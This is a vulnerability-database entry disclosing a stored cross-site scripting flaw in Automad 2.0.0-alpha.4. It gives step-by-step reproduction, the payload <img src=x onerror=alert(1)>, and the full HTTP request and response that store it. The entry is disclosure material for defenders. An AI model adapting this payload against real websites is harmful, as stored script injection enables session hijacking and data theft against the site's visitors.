---
title: Automad 2.0.0-alpha.4 Cross Site Scripting
url: https://cxsecurity.com/issue/WLB-2024060061
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-06-27
fetch_date: 2025-10-06T16:54:26.697483
---

# Automad 2.0.0-alpha.4 Cross Site Scripting

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Automad 2.0.0-alpha.4 Cross Site Scripting** **2024.06.26**  Credit:  **[Jerry Thomas](https://cxsecurity.com/author/Jerry%2BThomas/1/)**  Risk: **Low**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-79](https://cxsecurity.com/cwe/CWE-79 "Click to see CWE-79")** | |

# Exploit Title: Automad 2.0.0-alpha.4 - Stored Cross-Site Scripting (XSS)
# Date: 20-06-2024
# Exploit Author: Jerry Thomas (w3bn00b3r)
# Vendor Homepage: https://automad.org
# Software Link: https://github.com/marcantondahmen/automad
# Category: Web Application [Flat File CMS]
# Version: 2.0.0-alpha.4
# Tested on: Docker version 26.1.4, build 5650f9b | Debian GNU/Linux 11
(bullseye)
# Description
A persistent (stored) cross-site scripting (XSS) vulnerability has been
identified in Automad 2.0.0-alpha.4. This vulnerability enables an attacker
to inject malicious JavaScript code into the template body. The injected
code is stored within the flat file CMS and is executed in the browser of
any user visiting the forum. This can result in session hijacking, data
theft, and other malicious activities.
# Proof-of-Concept
\*Step-1:\* Login as Admin & Navigate to the endpoint
http://localhost/dashboard/home
\*Step-2:\* There will be a default Welcome page. You will find an option to
edit it.
\*Step-3:\* Navigate to Content tab or
http://localhost/dashboard/page?url=%2F&section=text & edit the block named
\*\*\*`Main`\*\*\*
\*Step-4:\* Enter the XSS Payload - <img src=x onerror=alert(1)>
\*Request:\*
POST /\_api/page/data HTTP/1.1
Host: localhost
Content-Length: 1822
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
(KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36
Content-Type: multipart/form-data;
boundary=----WebKitFormBoundaryzHmXQBdtZsTYQYCv
Accept: \*/\*
Origin: http://localhost
Referer: http://localhost/dashboard/page?url=%2F&section=text
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie:
Automad-8c069df52082beee3c95ca17836fb8e2=d6ef49301b4eb159fbcb392e5137f6cb
Connection: close
------WebKitFormBoundaryzHmXQBdtZsTYQYCv
Content-Disposition: form-data; name="\_\_csrf\_\_"
49d68bc08cca715368404d03c6f45257b3c0514c7cdf695b3e23b0a4476a4ac1
------WebKitFormBoundaryzHmXQBdtZsTYQYCv
Content-Disposition: form-data; name="\_\_json\_\_"
{"data":{"title":"Welcome","+hero":{"blocks":[{"id":"KodzL-KvSZcRyOjlQDYW9Md2rGNtOUph","type":"paragraph","data":{"text":"Testing
for
xss","large":false},"tunes":{"layout":null,"spacing":{"top":"","right":"","bottom":"","left":""},"className":"","id":""}},{"id":"bO\_fxLKL1LLlgtKCSV\_wp2sJQkXAsda8","type":"paragraph","data":{"text":"<h1>XSS
identified by
Jerry</h1>","large":false},"tunes":{"layout":null,"spacing":{"top":"","right":"","bottom":"","left":""},"className":"","id":""}}],"automadVersion":"2.0.0-alpha.4"},"+main":{"blocks":[{"id":"lD9sUJki6gn463oRwjcY\_ICq5oQPYZVP","type":"paragraph","data":{"text":"You
have successfully installed Automad 2.<br><br><img src=x
onerror=alert(1)><br>","large":false},"tunes":{"layout":null,"spacing":{"top":"","right":"","bottom":"","left":""},"className":"","id":""}},{"id":"NR\_n3XqFF94kfN0jka5XGbi\_-TBEf9ot","type":"buttons","data":{"primaryText":"Visit
Dashboard","primaryLink":"/dashboard","primaryStyle":{"borderWidth":"2px","borderRadius":"0.5rem","paddingVertical":"0.5rem","paddingHorizontal":"1.5rem"},"primaryOpenInNewTab":false,"secondaryText":"","secondaryLink":"","secondaryStyle":{"borderWidth":"2px","borderRadius":"0.5rem","paddingHorizontal":"1.5rem","paddingVertical":"0.5rem"},"secondaryOpenInNewTab":true,"justify":"start","gap":"1rem"},"tunes":{"layout":null,"spacing":{"top":"","right":"","bottom":"","left":""},"className":"","id":""}}],"automadVersion":"2.0.0-alpha.4"}},"theme\_template":"project","dataFetchTime":"1718911139","url":"/"}
------WebKitFormBoundaryzHmXQBdtZsTYQYCv--
\*Response:\*
HTTP/1.1 200 OK
Server: nginx/1.24.0
Date: Thu, 20 Jun 2024 19:17:35 GMT
Content-Type: application/json; charset=utf-8
Connection: close
X-Powered-By: PHP/8.3.6
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 30`
{"code":200,"time":1718911055}
\*Step-5:\* XSS triggers when you go to homepage - http://localhost/

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024060061)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top